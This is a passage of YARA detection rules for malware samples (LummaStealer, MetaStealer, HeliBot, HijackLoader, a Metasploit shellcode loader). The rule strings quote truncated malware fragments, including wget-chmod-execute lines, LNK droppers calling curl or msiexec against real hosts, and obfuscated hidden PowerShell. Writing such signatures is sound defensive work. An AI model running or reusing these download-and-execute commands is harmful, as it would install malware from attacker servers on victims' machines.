      $s2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Interaccused107 ($lvsav){ $tykkerters=1;do {$procavia114+=$lvsav[$tykk" ascii /* score: '25.00'*/
      $s3 = "ger;Legetantes (Interaccused107 'P$PGPlPOPBPaPlP:PFPO,RPmPy N DPe.rPs,k APBPE.rPN E.SP0P=P( TPePSPtP- P A TPh. P$PJ A zPzPP aPrP" ascii /* score: '16.00'*/
      $s4 = "ed107 'u$ guLuO.b a L : c.R.OuU.tuH  .=u  G e t -ucuOun TuE N Tu  $ Jua,Z,zuPuAuR');Legetantes (Interaccused107 '#$#g#l o#b.a l#" ascii /* score: '16.00'*/
      $s5 = "eraccused107 ' $ZgZl oZB aZl :ZfZOZr MZYZNZD EZrZs,kZA b eZrZn e,s 0 =Z(,TZE s tZ- P,aZt hZ Z$ j AZz ZZPZaZrZ)') ;Legetantes (In" ascii /* score: '13.00'*/
      $s6 = "G>';$outbleed=Interaccused107 'pI.Epx';$reorganise='pointenes';$ravenhood='\\Afkodede.Ery';Legetantes (Interaccused107 ' $]g]l o" ascii /* score: '12.00'*/
      $s7 = " alTlAlel.lclOlUlN T') ;$predonate=$euconjugatae[$varmefordelinger]}$chorditis=435638;$unpersecuted=27615;Legetantes (Interaccus" ascii /* score: '9.00'*/
      $s8 = "E5u C5O n j5U.g5A T5a5e5=5$ p R e.D O N,A T E5.5s5p l I5T (,$ m5a5H5B5u5b5)');Legetantes (Interaccused107 $svalerodenes);$predon" ascii /* score: '9.00'*/
      $s9 = "tantes $udsknkes59;Legetantes (Interaccused107 'D[ t H rDE aDD I nDG . tDhDr e.ADDD]D:D:,s.L E e PD( 4 0,0 0D)');Legetantes (Int" ascii /* score: '9.00'*/
      $s10 = "n;d;F U g;l');Legetantes ($shim);Legetantes (Interaccused107 ' $wpwewcwuwlwawtwiwn gw. Hwe a,dwe rwsw[ $wdwi s h ewv e.l lwiwn g" ascii /* score: '9.00'*/
      $s11 = "B A]l :]b]R]n]e]P]D a G,O]G]E]r]=,$ E]N]V : a P]p]d]A,t A]+]$]R a V E]n,h O o]D');Legetantes (Interaccused107 '5$ g5L5O b A5l5:5" ascii /* score: '9.00'*/
      $s12 = ")');while (!$formynderskabernes0) {Legetantes (Interaccused107 ' $ g lbobb a lb: Sbpbe cbibobubsb= $bu,l tbr a r,abpbibd') ;Lege" ascii /* score: '9.00'*/
      $s13 = "b>s T>r i N>g ( $ c>h o>R D I>t i.s ,>$>u>N>P>E>R S>E c u>T.E>D )');Legetantes $knstrmper;\"" fullword ascii /* score: '9.00'*/
      $s14 = "r,I n(g (($ P,u(P i(l()');Legetantes (Interaccused107 ' $ g L o,b>a>l>:>K>n s t.R>M.p>e R>=>$>r a A d>s>f>o.R>m>n>d>E n e . S>U>" ascii /* score: '9.00'*/
      $s15 = "sisr,e fso xs/ 1s4s1s.s0';$dishevelling=Interaccused107 ' URSReRr -RaRg E N t';$predonate=Interaccused107 'UhUtUt.pUsU: /U/Us eU" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 9KB and
      8 of them
}

rule LummaStealer_signature__536592d1313edded516434422df9d55e_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_536592d1313edded516434422df9d55e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "69f2d95363585467a9d8b46ae53d1f3adf14874bb50a95bde75b4ca80495615b"
   strings:
      $x1 = ";ETAALPHAGENERATOR Action enhancementCycle completed cleanly:PHIOMICRONIOTAMONITOR Check for verificationUnit completed*USER: Up" wide /* score: '51.00'*/
      $x2 = "ILambdaEpsilonYConnector Operation configurationRun finalized successfully2ZetaTransformer Validation of validation succeeded8DA" wide /* score: '49.00'*/
      $x3 = "8IotaGammaProfiler Connection to routingCycle established%USER: STREAMLINER Status report: 92944ChiPiIndexer Commencing analysis" wide /* score: '47.00'*/
      $x4 = "3Dispatcher Module patchingTask activated with CD03.>LOG: XITHETABETAUPSILONQUERYENGINE Parameters for 6DD4 updated*DATA: Transm" wide /* score: '47.00'*/
      $x5 = ",PhiOmicronFilter Parameters for 5C5E updated?TASK: OmegaSigmaMuGuard Backup finalized at 2025-09-13 05:50:103Refining TauNuEtaA" wide /* score: '45.00'*/
      $x6 = "UBetaUpsilonXiClusterManager Component authenticationCycle activated with status: 3EDB2OMICRONDATASTORE User task executed: plan" wide /* score: '44.00'*/
      $x7 = "DDATA: EtaAlphaGenerator Task configurationCycle launched [Ref: CDD1]6PROC: PHIPORTAL Network link to enhancementTask activeJEps" wide /* score: '43.00'*/
      $x8 = "ELambdaEpsilonScheduler Module initializationRun started with ID: 52A47UpsilonXiThetaHub Network link to trackingSystem active>U" wide /* score: '41.00'*/
      $x9 = "8Completed ChiPiKappaDeltaStream scanning task @ 09:05:32/ALPHATAUPROCESSORUNIT Settings for EADF applied'Nexus Synchronization " wide /* score: '40.00'*/
      $x10 = "CTHETABETAOPTIMIZER Action alignmentCycle completed without errors>>1OMEGASIGMAMUCONVERTER Parameters for 99F2 updated%PHIPORTAL" wide /* score: '39.00'*/
      $x11 = "AGENT System check: 096EIDELTACHIPIKAPPAORCHESTRATOR Starting validationCycle workflow at 06:39:59?PiKappaDeltaCoordinator Modul" wide /* score: '38.00'*/
      $x12 = "DEBUGGER Data sync finalizedIPsiRhoLambdaEpsilonReplicator Module integrationCycle activated with D4DC7RhoListener Connection to" wide /* score: '38.00'*/
      $x13 = "2Optimizing LAMBDABROKER for analysisJob throughput1OBSERVER Archive completed at 2025-09-13 08:07:17*LambdaChannel Software upd" wide /* score: '38.00'*/
      $x14 = "=RhoLambdaEpsilonPsiExecutor Synchronization process completed<ETAALPHATAUOBSERVER Initiating archivingRun process on 08:33,SYS:" wide /* score: '37.00'*/
      $x15 = "'SigmaMuZetaCache Managing FD87 datasetsITASK: UpsilonXiClusterManager Initiating tracking process on 05:29:44.492/SYS: ChiDispa" wide /* score: '37.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*)
}

rule Metasploit_signature__05576c1a0a67b26f4b84fe8cd46e5920_imphash_ {
   meta:
      description = "_subset_batch - file Metasploit(signature)_05576c1a0a67b26f4b84fe8cd46e5920(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f9e9709e71c934719c20812d0fb6f98f4e58721d651b04cf0395430607d7951b"
   strings:
      $x1 = "[-] Error while getting an handle on NTDLL.dll" fullword ascii /* score: '32.00'*/
      $s2 = "[+] Shellcode ran successufully, ciao grande!" fullword ascii /* score: '25.00'*/
      $s3 = "[+] Executed thread with Id : %d" fullword ascii /* score: '22.00'*/
      $s4 = "[+] Payload written successfully" fullword ascii /* score: '17.00'*/
      $s5 = "[-] Error while writing virtual memory. Code: %lu " fullword ascii /* score: '13.00'*/
      $s6 = "[-] Error while changing memory protections. Code: %lu " fullword ascii /* score: '13.00'*/
      $s7 = "[!] Error while creating thread. Code: %lu " fullword ascii /* score: '12.00'*/
      $s8 = "[-] Error while retrieving ZW functions" fullword ascii /* score: '11.00'*/
      $s9 = "[-] Error while allocating memory. Code: %lu " fullword ascii /* score: '9.00'*/
      $s10 = ".data$rs" fullword ascii /* score: '8.00'*/
      $s11 = "[+] Memory is now RWX" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      1 of ($x*) and all of them
}

rule MetaStealer_signature__05c7df6d575c13faf78878f9450f3b20_imphash_ {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_05c7df6d575c13faf78878f9450f3b20(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0583da8c5fd0fffa254d4864c4f1df12985a5fd59bf99d475875780fc7deadbd"
   strings:
      $s1 = "* ]Gjt" fullword ascii /* score: '9.00'*/
      $s2 = "LOgTG!" fullword ascii /* score: '9.00'*/
      $s3 = "* b|it" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      all of them
}

rule MetaStealer_signature__05c7df6d575c13faf78878f9450f3b20_imphash__3b318768 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_05c7df6d575c13faf78878f9450f3b20(imphash)_3b318768.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b3187688b40ce5b91e347f55fa6dd13fbafaa398f1ffa890b8f63b6cfaeefb8"
   strings:
      $s1 = "msedge_pwa_launcher.exe" fullword wide /* score: '19.00'*/
      $s2 = "BU.logY" fullword ascii /* score: '10.00'*/
      $s3 = "7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a" fullword ascii /* score: '9.00'*/ /* hex encoded string 'zzzzzzzzzzzzzzzzz' */
      $s4 = "7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~" ascii /* score: '9.00'*/ /* hex encoded string 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz' */
      $s5 = "7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~" ascii /* score: '9.00'*/ /* hex encoded string 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz' */
      $s6 = "7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~" ascii /* score: '9.00'*/ /* hex encoded string 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz' */
      $s7 = "7a>~7a\\~7a" fullword ascii /* score: '9.00'*/ /* hex encoded string 'zzz' */
      $s8 = "8W- -K" fullword ascii /* score: '9.00'*/
      $s9 = "7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a ~7a" fullword ascii /* score: '9.00'*/ /* hex encoded string 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz' */
      $s10 = "gfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpy" ascii /* score: '8.00'*/
      $s11 = "gfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpy" ascii /* score: '8.00'*/
      $s12 = "E#.TXT*" fullword ascii /* score: '8.00'*/
      $s13 = "gfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpy" fullword ascii /* score: '8.00'*/
      $s14 = "v3%s%x" fullword ascii /* score: '8.00'*/
      $s15 = "gfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpygfpy" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      8 of them
}

rule MetaStealer_signature__05c7df6d575c13faf78878f9450f3b20_imphash__e9c1c127 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_05c7df6d575c13faf78878f9450f3b20(imphash)_e9c1c127.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e9c1c127da13ac691a4264afb8d5083cfcd280cb25efb2588bdfddcb193d82c7"
   strings:
      $s1 = "* ]Gjt" fullword ascii /* score: '9.00'*/
      $s2 = "LOgTG!" fullword ascii /* score: '9.00'*/
      $s3 = "* b|it" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      all of them
}

rule MetaStealer_signature__05c7df6d575c13faf78878f9450f3b20_imphash__f1a92dcd {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_05c7df6d575c13faf78878f9450f3b20(imphash)_f1a92dcd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1a92dcd137a157fc01319998deeada04ddebdb88c33d2d86e71d50549d34eaf"
   strings:
      $s1 = "* 5\\&v" fullword ascii /* score: '9.00'*/
      $s2 = "J~%d%tk" fullword ascii /* score: '8.00'*/
      $s3 = "gkupoku" fullword ascii /* score: '8.00'*/
      $s4 = "gjtpoku" fullword ascii /* score: '8.00'*/
      $s5 = "hnrlxpr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      all of them
}

rule HeliBot_signature_ {
   meta:
      description = "_subset_batch - file HeliBot(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5368bff56c657179b4fe196d01b2fee7c99e8e632462f23c53ef3c03867562a3"
   strings:
      $x1 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.arm7; chmod +x Demon.arm7; ./Demon.arm" ascii /* score: '33.00'*/
      $x2 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.ppc; chmod +x Demon.ppc; ./Demon.ppc; " ascii /* score: '33.00'*/
      $x3 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.arm5; chmod +x Demon.arm5; ./Demon.arm" ascii /* score: '33.00'*/
      $x4 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.arm4; chmod +x Demon.arm4; ./Demon.arm" ascii /* score: '33.00'*/
      $x5 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.mpsl; chmod +x Demon.mpsl; ./Demon.mps" ascii /* score: '33.00'*/
      $x6 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.arm6; chmod +x Demon.arm6; ./Demon.arm" ascii /* score: '33.00'*/
      $x7 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.mips; chmod +x Demon.mips; ./Demon.mip" ascii /* score: '33.00'*/
      $x8 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.ppc; chmod +x Demon.ppc; ./Demon.ppc; " ascii /* score: '33.00'*/
      $s9 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.sparc; chmod +x Demon.sparc; ./Demon.s" ascii /* score: '30.00'*/
      $s10 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.arm7; chmod +x Demon.arm7; ./Demon.arm" ascii /* score: '30.00'*/
      $s11 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.ppc440fp; chmod +x Demon.ppc440fp; ./D" ascii /* score: '30.00'*/
      $s12 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.m68k; chmod +x Demon.m68k; ./Demon.m68" ascii /* score: '30.00'*/
      $s13 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.arm5; chmod +x Demon.arm5; ./Demon.arm" ascii /* score: '30.00'*/
      $s14 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.x86; chmod +x Demon.x86; ./Demon.x86; " ascii /* score: '30.00'*/
      $s15 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.111.160/Demon.i686; chmod +x Demon.i686; ./Demon.i68" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x652d and filesize < 6KB and
      1 of ($x*) and all of them
}

rule Heodo_signature_ {
   meta:
      description = "_subset_batch - file Heodo(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1c3cb7e21b5bb10a403305e4c37413cd6833098f0f43d32eaf127e8985e6633"
   strings:
      $s1 = "..\\..\\Windows\\system32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s2 = "/v:on /c BxGSGv381nuP6+SPvmi08rxgHGzonZdOP64gxqCX21LiOs8rD8EdxfrDvYMoV33TZWYu7Xep||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c \"&{ iex ([" wide /* score: '25.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 7KB and
      all of them
}

rule MetaStealer_signature_ {
   meta:
      description = "_subset_batch - file MetaStealer(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd6afeafadbec38d327ab59ba5bed6375e4e6a0f94f2d30646a6d48713302a4f"
   strings:
      $x1 = "/k  start msedge https://unec.edu.az/application/uploads/2014/12/pdf-sample.pdf & msiexec /i http://185.219.7.138:8080/top/nv.ms" wide /* score: '48.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      1 of ($x*) and all of them
}

rule MetaStealer_signature__3a6c20ee {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_3a6c20ee.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3a6c20eec85fdc20f50f0f4fd8b1553a89353d8eea78ce21c647db1cf65bc1ba"
   strings:
      $x1 = "cmd.exe /c start msedge \"https://ups-supp.com/pdf/address-validation-guidelines.pdf\" && curl -sLo \"%TEMP%\\v209up.pdf\" \"htt" wide /* score: '75.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule MetaStealer_signature__50539ac5 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_50539ac5.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "50539ac527595e40fac8512edecf57d40ff4ebb02b67f35e0b457097b521274d"
   strings:
      $x1 = "/k \"start msedge bing.com/error & powershell -EncodedCommand JABvAHUAdABwAHUAdAA9ACIAJABlAG4AdgA6AFQARQBNAFAAXAAyADkAMAA4AC4AbQ" wide /* score: '46.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = ")cmd.exe" fullword wide /* score: '30.00'*/
      $s4 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s5 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s6 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule MetaStealer_signature__a2c1e838 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_a2c1e838.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a2c1e838e1f62b20aabb73a57c0e6979236bf53d2c9cec3e15e4f07f3f852726"
   strings:
      $x1 = "cmd.exe /c start msedge \"https://wordpress-patches.com/cve-2025-54552/CVE-2025-54552-Patch.pdf\" && curl -sLo \"%TEMP%\\v209p.p" wide /* score: '76.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule MetaStealer_signature__de7183ef {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_de7183ef.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "de7183ef61c4c9a5d034e239dce55cac2688d626d880905d53b8f5c010022b6e"
   strings:
      $x1 = "cmd.exe /c start msedge \"https://app-ups.com/pdf/address-validation-guidelines.pdf\" && curl -sLo \"%TEMP%\\api-guide.pdf\" \"h" wide /* score: '75.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule MetaStealer_signature__e029ccaf {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_e029ccaf.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e029ccaf94345a95dcb7900e1038517dfd1bb4a64f106f88498e8cf3f7340d11"
   strings:
      $x1 = "cmd.exe /c start msedge \"https://app-ups.com/pdf/address-validation-guidelines.pdf\" && curl -sLo \"%TEMP%\\v209up.pdf\" \"http" wide /* score: '75.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__d6a94b849b61f38a50afae24c5fb0abf_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_d6a94b849b61f38a50afae24c5fb0abf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5386af6b4fbc057a092ce7fbe3b52702aae6242ff24c0486d7b073dc4a078687"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule LummaStealer_signature__d6a94b849b61f38a50afae24c5fb0abf_imphash__02f884ba {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_d6a94b849b61f38a50afae24c5fb0abf(imphash)_02f884ba.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "02f884ba8ca16bfd9fa50384ead367ac2378840ca3c0810538ba80f216ba502a"
   strings:
      $s1 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s2 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule HijackLoader_signature_ {
   meta:
      description = "_subset_batch - file HijackLoader(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f2a068164ed7b173f17abe52ad95c53bccf3bb9966d75027d1e8960f7e0d43ac"
   strings:
      $x1 = "powershell -WindowStyle Hidden -Command \"Start-Process cmd.exe -ArgumentList '/c','\"\"%~f0\"\"','stealth' -WindowStyle Hidden" ascii /* score: '44.00'*/
      $s2 = "        powershell -Command \"(New-Object Net.WebClient).DownloadFile('%SOURCE%/%%F', '%TARGET_DIR%\\%%F')\" >nul 2>&1" fullword ascii /* score: '29.00'*/
      $s3 = "        curl.exe -s -k -o \"%TARGET_DIR%\\%%F\" \"%SOURCE%/%%F\" >nul 2>&1" fullword ascii /* score: '28.00'*/
      $s4 = "if not exist \"%TARGET_DIR%\\LPBNZSLE.msi\" (" fullword ascii /* score: '25.00'*/
      $s5 = "start \"\" \"%TARGET_DIR%\\LPBNZSLE.msi\"" fullword ascii /* score: '25.00'*/
      $s6 = "set \"TARGET_DIR=%temp%\\AppData\"" fullword ascii /* score: '25.00'*/
      $s7 = "    where /q curl.exe" fullword ascii /* score: '22.00'*/
      $s8 = "if not exist \"%TARGET_DIR%\" mkdir \"%TARGET_DIR%\"" fullword ascii /* score: '18.00'*/
      $s9 = "timeout /t 3 /nobreak >nul" fullword ascii /* score: '12.00'*/
      $s10 = "set \"SOURCE=http://80.253.249.186:5504\"" fullword ascii /* score: '12.00'*/
      $s11 = "set \"FILES=LPBNZSLE.msi\"" fullword ascii /* score: '11.00'*/
      $s12 = " LPBNZSLE.msi " fullword ascii /* score: '11.00'*/
      $s13 = "for %%F in (%FILES%) do (" fullword ascii /* score: '8.00'*/
      $s14 = "exit /b" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__2 {
   meta:
      description = "_subset_batch - file HijackLoader(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d7af2ba31e7fd12803fc110abcc57c3d38cc373fd23f55e6c3a5c4fbd1d36974"
   strings:
      $s1 = "61202B2027" ascii /* score: '17.00'*/ /* hex encoded string 'a + '' */
      $s2 = "hnBbeRNBcFZuZCqOQMTRWIyfbCCfhvcmdTSfmBakpKTdkpkDiqUhkElYoVzcOiTgcmRGjLcPljbMpUvlRywravBZitqQByVHqmAxYeUXNFvBcZjUaOKQlcGglsYpULOn" ascii /* score: '12.00'*/
      $s3 = "GvxzpdMffmPCXugBniFxWwYInisljMPKmUckBJdejmYjOFcWsPYXvkyKWpLGkavTWFPDSvAeFaOjXpuhGWsUnsOCVRNLyWuJqFMIqZDwPuRVWOmhvdAOhbferNhAhogi" ascii /* score: '9.00'*/
      $s4 = "NUWCTxNneZdVAAwJKWqmnFWNgUMfGeCCrHoHChAcBXlLzlglvPfyVbAHyIVzlhgzWbdsLoGcVNlPTKOvnbkrzEgQHgJuMAqUrmoYHoZGICcIpknnuZMKwozSuNkffLQV" ascii /* score: '9.00'*/
      $s5 = "YkjpkeZknmBTbWTsZaKrgZKAtouowgCTRNXUMPHrDpkVNNoQtvGdkIozZjvvjloGkhCNyzfJSSoropngAdvBaYjIZYudULHSAdkfKaSuPwKRUwLkvOvFqmgMyuoaECpH" ascii /* score: '9.00'*/
      $s6 = "gObJWWvoArPZrckznZjvYQQYsleVnHYHAmLjBgzWUOmBIorWPbNjtFTPyDQksZAsSHYERBxGZNbKdOPEtHFMupNuTwlyQOduNujAQnFOdHJgeJmjoMr" fullword ascii /* score: '9.00'*/
      $s7 = "fwiSdsUgsnrTOIUmvapVsKQAOiVUCZQkhlyyNZATStubonNWbnnHRIvUghEuXAeSXGmdJVZWaVCzQoMaUzsPlISZpdSfVFwSPbDiBkMFNRhwFwErVdZXHOhPnMnfDuAU" ascii /* score: '9.00'*/
      $s8 = "XagfFjLxvRpMlORTLInjjFFZoNsaqvvePAXoIBQcdFVnIvETBWPFXQhRUGqsrkGAVKxkqdKJsLFejRQsIYYUfqHyTFTBLXlsyVSyyTdYLGMLKDiCqxkSMmUeCyRkJJxV" ascii /* score: '9.00'*/
      $s9 = "eOEWebgHHxADWXcEBDtMsPvLaCKDXxodvQVCHmJbpgeaSgeTGDuWExxPTtvbRdjKJXHFCZxPtSWMkUsuYqwUCRYyTFjOriJLxTRvZYRgGfdlalfyABDagPHryImwqjXL" ascii /* score: '9.00'*/
      $s10 = "eqCYafKZQxXyBAordcGseYcHsZLbrrsVFYwFTvOkVUFvRsiyLBAThSvFOufBUjhYFBscEiYhOWXKTgpzrNQqqYnndqrYQMQlmgqPAFuccTFLulmhEgKHTrhgOEzNrARB" ascii /* score: '9.00'*/
      $s11 = "cLmmxtNIBVNTzKAZovMLbYUrTylkDUJShiAtJMnGWrcvEwRicbwxoUiErvTyHdFgMulQJHPbIFojvYnWgDHbXMdMAwBOtoztmwjJKAYVLUoigyISIwSDVdIARZQMFBiU" ascii /* score: '9.00'*/
      $s12 = "hqKmvzqPgbLzXtNCDkCpEpIUybXnxIgSLfwgkbvRiYmddcGakHPGOyVriqnUcCRYusoswhRcplGgDerWUwDptZDMKFxunapgGNikoOdCqmRdsonDzRAfycfVpbhrkWoP" ascii /* score: '9.00'*/
